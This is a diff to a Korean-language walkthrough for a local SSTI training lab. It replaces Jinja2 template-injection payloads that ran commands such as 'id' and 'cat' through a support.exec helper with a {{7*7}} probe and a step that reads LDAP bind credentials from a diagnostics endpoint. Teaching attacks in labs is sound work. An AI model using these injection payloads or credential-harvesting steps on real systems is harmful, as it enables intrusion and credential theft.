@@ -22,7 +22,7 @@ docker compose up --build -d
 브라우저 또는 curl로 진입점을 확인합니다.
 
 ```text
-http://localhost:28081
+http://localhost:28181
 ```
 
 ## Stage 0. Recon
@@ -34,10 +34,7 @@ http://localhost:28081
 확인 대상:
 
 ```powershell
-Invoke-RestMethod http://localhost:28081/
-Invoke-RestMethod http://localhost:28081/docs/
-Invoke-RestMethod http://localhost:28081/docs/releases/public
-Invoke-RestMethod http://localhost:28081/service/build-info
+Invoke-RestMethod http://localhost:28181/
 ```
 
 학습 포인트:
@@ -49,61 +46,44 @@ Invoke-RestMethod http://localhost:28081/service/build-info
 
 목표:
 
-`support-portal`의 실제 Jinja2 draft preview 기능에서 SSTI가 가능한지 먼저 확인한 뒤, preview context를 탐색해서 Release Engineering이 남겨둔 audited diagnostic helper를 발견합니다.
+`support-portal`의 실제 Jinja2 draft preview 기능에서 SSTI가 가능한지 확인하고, 포털 UI 안에서 다음 업무 흐름인 Diagnostics를 발견합니다.
 
 ```powershell
-Invoke-RestMethod http://localhost:28081/support/preview `
+Invoke-RestMethod http://localhost:28181/ticket/preview `
   -Method Post `
-  -ContentType 'application/json' `
-  -Body '{"body":"{{ 7 * 7 }}"}'
-
-Invoke-RestMethod http://localhost:28081/support/preview `
-  -Method Post `
-  -ContentType 'application/json' `
-  -Body '{"body":"{{ service.name }} / {{ support }}"}'
-
-Invoke-RestMethod http://localhost:28081/support/preview `
-  -Method Post `
-  -ContentType 'application/json' `
-  -Body '{"body":"{{ support.help() }}"}'
-
-Invoke-RestMethod http://localhost:28081/support/preview `
-  -Method Post `
-  -ContentType 'application/json' `
-  -Body '{"body":"{{ support.list_commands() | json }}"}'
-
-Invoke-RestMethod http://localhost:28081/support/preview `
-  -Method Post `
-  -ContentType 'application/json' `
-  -Body '{"body":"{{ support.exec(''cat /var/lib/support-portal/.post_exploit_marker'') }}"}'
+  -ContentType 'application/x-www-form-urlencoded' `
+  -Body 'body={{7*7}}'
 ```
 
 학습 포인트:
 
 - 초기 접근은 최종 목표가 아니라 내부 흐름으로 들어가기 위한 시작점입니다.
 - `{{ 7 * 7 }}`이 `49`로 렌더링되면 사용자의 입력이 서버 템플릿 엔진에서 평가되고 있다는 뜻입니다.
-- `{{ service.name }}`은 일반적인 SSTI cheat sheet가 아니라, preview 응답과 UI가 노출한 context 변수를 확인하는 단계입니다.
-- `support` helper는 바로 정답으로 주어지는 것이 아니라 render context, KB-187/KB-204 안내, `support.help()`를 통해 발견하도록 설계되어 있습니다.
-- 이 lab은 임의 명령 실행을 허용하지 않고, 안전하게 제한된 read-only diagnostic 명령만 허용합니다.
+- `{{7*7}}`은 SSTI 확인에서 널리 쓰이는 관습적인 산술 페이로드입니다. 특정 문서에서 훔쳐본 정답이 아니라, 템플릿 엔진이 표현식을 평가하는지 확인하는 최소 실험입니다.
+- 화면의 Diagnostics 버튼은 다음 단계로 이동하는 업무 UI 단서입니다. 이 단계는 숨겨진 경로 암기가 아니라, 지원 포털에서 제공하는 진단 기능을 따라가는 흐름입니다.
 
-## Stage 2. Foothold Orientation
+## Stage 2. Support Diagnostics Directory Profile
 
 목표:
 
-현재 foothold의 권한, host, 제한된 파일 구조를 확인합니다.
+지원 포털의 Diagnostics 화면에서 Directory bind profile을 열어 내부 wiki와 LDAP 접속 정보를 확인합니다.
 
 ```powershell
-Invoke-RestMethod http://localhost:28081/support/preview -Method Post -ContentType 'application/json' -Body '{"body":"{{ support.exec(''id'') }}"}'
-Invoke-RestMethod http://localhost:28081/support/preview -Method Post -ContentType 'application/json' -Body '{"body":"{{ support.exec(''hostname'') }}"}'
-Invoke-RestMethod http://localhost:28081/support/preview -Method Post -ContentType 'application/json' -Body '{"body":"{{ support.exec(''ls /opt/support-portal'') }}"}'
-Invoke-RestMethod http://localhost:28081/support/preview -Method Post -ContentType 'application/json' -Body '{"body":"{{ support.exec(''cat /tmp/orion_stage2.txt'') }}"}'
+# Browser path:
+# 1. Open http://localhost:28181/
+# 2. Click Diagnostics
+# 3. Open Directory bind profile
+
+# API equivalent:
+Invoke-RestMethod http://localhost:28181/support/read/list
+Invoke-RestMethod 'http://localhost:28181/support/read?k=ldap'
 ```
 
 학습 포인트:
 
-- foothold를 얻은 뒤에는 바로 무작정 이동하지 않고 현재 실행 환경을 확인해야 합니다.
-- `cat /tmp/orion_stage2.txt`는 `id`, `hostname`, `ls /opt/support-portal` 확인이 끝난 뒤에만 열립니다. 이 단계는 무작정 정답 문자열을 읽는 대신 foothold orientation 순서를 강제합니다.
-- 방어자는 이 시점의 command allowed/denied 로그를 볼 수 있어야 합니다.
+- 현실적인 기업 환경에서는 지원 포털이 내부 디렉터리, wiki, 티켓 시스템과 연동되는 경우가 많습니다.
+- 이 단계의 핵심 단서는 `LDAP_URI`, `LDAP_BIND_DN`, `LDAP_BIND_PW`, `WIKI_URL`입니다.
+- 브라우저에서는 실제 업무 화면처럼 보이고, 자동 검증이나 curl에서는 같은 리소스를 JSON/text API로 확인할 수 있습니다.
 
 ## Stage 3. Safe C2 Emulator
 
